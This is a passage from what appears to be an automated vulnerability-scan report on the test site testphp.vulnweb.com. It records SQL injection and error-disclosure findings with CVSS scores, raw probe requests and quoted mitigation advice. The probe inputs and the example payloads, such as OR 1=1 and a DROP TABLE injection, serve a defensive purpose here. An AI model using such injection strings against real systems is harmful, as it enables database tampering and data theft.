<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /search.php?test=1'&quot; HTTP/1.1
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

goButton=go&amp;searchFor=]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:37 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 6689
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="71" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">id</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infocateg.php on line 7</font></pre>]]></Details>
       <Affects><![CDATA[/AJAX/infocateg.php]]></Affects>
       <Parameter><![CDATA[id]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /AJAX/infocateg.php?id=1'&quot; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:44 GMT
Content-Type: text/xml
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 145
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="72" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (Error_Message.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">artist</font></b> was set to <b><font color="dark"></font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">You have an error in your SQL syntax</font></pre>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[artist]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?artist= HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:48 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4180
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
